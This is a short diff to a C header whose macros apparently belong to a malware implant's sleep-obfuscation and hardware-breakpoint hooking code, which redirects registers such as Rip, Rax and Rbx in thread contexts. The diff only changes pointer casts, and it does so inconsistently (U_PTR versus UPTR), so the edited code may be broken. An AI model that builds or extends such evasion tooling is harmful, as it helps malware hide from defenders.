@@ -3,11 +3,11 @@
 
 #define OBF_JMP( i, p ) \
     if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
-        Ctx[i].Rax = U_PTR( p );                 \
+        Ctx[i].Rax = (U_PTR)( p );                 \
     } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
-        Ctx[i].Rbx = U_PTR( & p );               \
+        Ctx[i].Rbx = (U_PTR)( & p );               \
     } else {                                       \
-        Ctx[i].Rip = U_PTR( p );                 \
+        Ctx[i].Rip = (U_PTR)( p );                 \
     }
 
 /* ======== [ Hardware Breakpoint ] ======== */
@@ -36,9 +36,9 @@ typedef struct _DESCRIPTOR_HOOK {
 #define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )
 
 #ifdef _WIN64
-#define SET_RET( Ctx, Val )( U_PTR( Ctx->Rax = U_PTR( Val ) ) )
+#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Rax = (UPTR)( Val ) ) )
 #elif  _WIN32
-#define SET_RET( Ctx, Val )( U_PTR( Ctx->Eax = U_PTR( Val ) ) )
+#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Eax = (UPTR)( Val ) ) )
 #endif
 
 #define GET_ARG_1( Ctx ) ( Self->Hw->GetArg( Ctx, 0x1 ) )
